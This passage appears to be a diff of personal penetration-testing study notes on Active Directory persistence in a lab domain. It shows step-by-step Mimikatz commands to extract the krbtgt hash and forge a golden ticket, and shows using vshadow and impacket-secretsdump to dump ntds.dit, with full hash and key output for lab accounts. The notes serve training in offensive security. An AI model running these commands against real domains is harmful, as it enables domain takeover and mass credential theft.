@@ -476,3 +476,339 @@ corp\jen
 ```
 
 ## Active Directory Persistence
+
+### Golden Ticket
+
+When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt. If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets. , Golden Tickets provide a more powerful attack vector. While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.
+
+The best advantage is that the krbtgt account password is not automatically changed. This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version.
+
+!e will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a traditional command shell with the cmd command, which should fail due to perms.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.74 /drive:shared,/tmp
+
+PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\DC1 cmd.exe
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access DC1:
+Access is denied.
+```
+
+The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz. To simulate this, we'll log in to the domain controller with remote desktop using the jeffadmin account.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jeffadmin /v:192.168.214.70 /drive:shared,/tmp
+
+PS C:\Tools> .\mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369 // look!!
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 1693c6cefafffc7af11ef34d1c788f47 // look!!
+
+RID  : 0000044f (1103)
+User : dave
+LM   :
+NTLM : 08d7a47a6f9f66b97b1bae4178747494
+
+RID  : 00000450 (1104)
+User : stephanie
+LM   :
+NTLM : d2b35e8ac9d8f4ad5200acc4e0fd44fa
+
+RID  : 00000451 (1105)
+User : jeff
+LM   :
+NTLM : 2688c6d2af5e9c7ddb268899123744ea
+
+RID  : 00000452 (1106)
+User : jeffadmin
+LM   :
+NTLM : e460605a9dbd55097c6cf77af2f89a03
+
+RID  : 00000455 (1109)
+User : iis_service
+LM   :
+NTLM : 4d28cf5252d39971419580a51484ca09
+
+RID  : 00000463 (1123)
+User : pete
+LM   :
+NTLM : 369def79d8372408bf6e93364cc93075
+
+RID  : 00000464 (1124)
+User : jen
+LM   :
+NTLM : 369def79d8372408bf6e93364cc93075
+
+RID  : 000003e8 (1000)
+User : DC1$
+LM   :
+NTLM : 7869d0733dd7a6a60c58b6cae43c3535
+
+RID  : 00000458 (1112)
+User : WEB04$
+LM   :
+NTLM : 6ce7a763842704c39101fea70b77a6bc
+
+RID  : 0000045e (1118)
+User : FILES04$
+LM   :
+NTLM : 024e0b5bc4f09a8f909813e2c5041a2c
+
+RID  : 00000461 (1121)
+User : CLIENT74$
+LM   :
+NTLM : 31b5ed7d0a3a698d412c2d7d5aa2aca8
+
+RID  : 00000462 (1122)
+User : CLIENT75$
+LM   :
+NTLM : 83582e1d6c859ac47dc703bbe72bfe73
+
+RID  : 00000469 (1129)
+User : CLIENT76$
+LM   :
+NTLM : c06a3d3d9dfe4af367e7a2ea975274b7
+```
+
+
+Take the hash and return to your jen computer on CLIENT74.
+
+```console
+PS C:\Tools> .\mimikatz.exe
+
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+// supply the domain sid (which we can gather with whoami /user)
+
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+User      : jen
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
+Lifetime  : 4/25/2024 1:25:30 PM ; 4/23/2034 1:25:30 PM ; 4/23/2034 1:25:30 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jen @ corp.com' successfully submitted for current session
+
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF77477B800
+
+
+PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\dc1 cmd.exe
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.20348.887]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::dc29:d103:4373:df46%14
+   IPv4 Address. . . . . . . . . . . : 192.168.214.70
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254
+
+C:\Windows\system32>whoami
+corp\jen
+
+// Now let's use the whoami command to verify that our user jen is now part of the Domain Admin group.
+
+C:\Windows\system32>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes    
+=========================================== ================ ============================================ ===============================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
+CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
+CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
+CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
+CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level        Label            S-1-16-12288                                               
+```
+
+Jen is now a member of multiple powerful groups, including domain admins!
+
+If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.
+
+### Shadow Copies
+
+As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jeffadmin /v:192.168.214.70 /drive:shared,/tmp /d:corp.com
+
+PS C:\Tools> .\vshadow.exe -nw -p  C:
+
+VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
+Copyright (C) 2005 Microsoft Corporation. All rights reserved.
+
+
+(Option: No-writers option detected)
+(Option: Persistent shadow copy)
+(Option: Create shadow copy set)
+- Setting the VSS context to: 0x00000019
+Creating shadow set {d221eea3-d363-446b-aaf1-6ac6d64ee86d} ...
+- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
+Creating the shadow (DoSnapshotSet) ...
+(Waiting for the asynchronous operation to finish...)
+Shadow copy set succesfully created.
+
+List of created shadow copies:
+
+
+Querying all shadow copies with the SnapshotSetID {d221eea3-d363-446b-aaf1-6ac6d64ee86d} ...
+
+* SNAPSHOT ID = {e1c0b7f3-a7fc-466d-9919-5159cee525e5} ...
+   - Shadow copy Set: {d221eea3-d363-446b-aaf1-6ac6d64ee86d}
+   - Original count of shadow copies = 1
+   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
+   - Creation Time: 4/25/2024 4:51:33 PM
+   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2  // TAKE NOTE OF THIS NAME!!!!
+   - Originating machine: DC1.corp.com
+   - Service machine: DC1.corp.com
+   - Not Exposed
+   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
+   - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+
+Snapshot creation done.
+
+// take note of the "Shadow copy device name"
+
+// you might have to do this in cmd instaad of powershell.... try cmd if you get errors:)
+
+PS C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+PS C:\Tools> reg.exe save hklm\system c:\system.bak
+```
+
+Move the two .bak files to Kali.
+
+```console
+kali$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
+[*] Reading and decrypting hashes from ntds.dit.bak 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eb9131bbcdafe388b4ed8a511493dfc6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
+jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
+jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
+iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
+WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:6ce7a763842704c39101fea70b77a6bc:::
+FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:024e0b5bc4f09a8f909813e2c5041a2c:::
+CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:31b5ed7d0a3a698d412c2d7d5aa2aca8:::
+CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:83582e1d6c859ac47dc703bbe72bfe73:::
+pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:c06a3d3d9dfe4af367e7a2ea975274b7:::
+[*] Kerberos keys from ntds.dit.bak 
+Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
+Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
+Administrator:des-cbc-md5:fd79dc380ee989a4
+DC1$:aes256-cts-hmac-sha1-96:3a7eed97e5f097bfe765dd31dad3586aef70aaacaa2423840aa40c5596f4b3b7
+DC1$:aes128-cts-hmac-sha1-96:f49c5a4a9b383f10f83593050542a55a
+DC1$:des-cbc-md5:2568d502e564801f
+krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
+krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
+krbtgt:des-cbc-md5:683bdcba9e7c5de9
+dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+dave:des-cbc-md5:1a329b4338bfa215
+stephanie:aes256-cts-hmac-sha1-96:bacff5a5fbda4c38b58b343a5bc235021a366512d0aebf464662d0fe65fceb9f
+stephanie:aes128-cts-hmac-sha1-96:95218fc23b3e0784931a3ed38f6fdc60
+stephanie:des-cbc-md5:31ae1c9d3225da25
+jeff:aes256-cts-hmac-sha1-96:9af9aa5a4271ee27c111a40e16260ae8394bdb899d1b49771fbe110fa7982fd1
+jeff:aes128-cts-hmac-sha1-96:8957241e5ebb8321ccd595662a5a98d2
+jeff:des-cbc-md5:c8bff7f79283c138
+jeffadmin:aes256-cts-hmac-sha1-96:d6754b8ed7a9cb4ba2793aae0b77dac971fba194857843f97579e5fda7f682ab
+jeffadmin:aes128-cts-hmac-sha1-96:9f9c0be62237491d9eeeeb32d0f5eb1e
+jeffadmin:des-cbc-md5:d3b92f5eceecec86
+iis_service:aes256-cts-hmac-sha1-96:9fccc377d0bc13ca49bca6725a9af461f2ca65db4e03aa0ddb8969ab716052cc
+iis_service:aes128-cts-hmac-sha1-96:a4e7665d09c998d270ab363ed5db9919
+iis_service:des-cbc-md5:e5ba07c82fdc8c3b
+WEB04$:aes256-cts-hmac-sha1-96:af02f21345387c1dab135392282fb98a781e9b582600de925833143e65104ebc
+WEB04$:aes128-cts-hmac-sha1-96:4192f73bd75fc9d5ab09407edd469825
+WEB04$:des-cbc-md5:973ef4f4fd233786
+FILES04$:aes256-cts-hmac-sha1-96:9d0c4c86b754f4486511f1a2d3675611ed83fb9c72bc9e3fc733489c4abcd528
+FILES04$:aes128-cts-hmac-sha1-96:4dc6cd3a10be64c52deb6c55afa56925
+FILES04$:des-cbc-md5:8a4620f20b322025
+CLIENT74$:aes256-cts-hmac-sha1-96:ec1c97922e4e5274d32ef497019d570f2372ddd854ac57ca08913a0bd2ae38a6
+CLIENT74$:aes128-cts-hmac-sha1-96:911b1c2ba00bfb39db0c5ec4eb1e1138
+CLIENT74$:des-cbc-md5:b9bf134c1c207658
+CLIENT75$:aes256-cts-hmac-sha1-96:5e68be7a2d38cd7a43bec49cfa28547201f639c4135b954cfc49ba91d8bc6fc3
+CLIENT75$:aes128-cts-hmac-sha1-96:1993c6e121e27a8eadf70a6ce32bc325
+CLIENT75$:des-cbc-md5:f749c849b92f32f1
+pete:aes256-cts-hmac-sha1-96:27eb48bb2bfe936b430c6de8a7f550caa0f1827f98360179d9a88fdd0b511364
+pete:aes128-cts-hmac-sha1-96:e193f9ac58c54f8441fa60bfe332d68b
+pete:des-cbc-md5:167a70ced398a4c8
+jen:aes256-cts-hmac-sha1-96:e7888faaee7503efe4888e146c7c24bb87507a33ce449b2e85805988f35daf99
+jen:aes128-cts-hmac-sha1-96:5dafc32c5844d2a3c89ffcc7409ad7e4
+jen:des-cbc-md5:4985324658587557
+CLIENT76$:aes256-cts-hmac-sha1-96:5c935c36be126e0ddbc4dadf3bef247b380f38988938091c3c642be00b985838
+CLIENT76$:aes128-cts-hmac-sha1-96:bcc8425cf7f37a699df031acf8c12d55
+CLIENT76$:des-cbc-md5:dce683e3409b9402
+[*] Cleaning up... 
+```
+
+We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try to crack them or use as-is in pass-the-hash attacks.
+
+While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation. To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.
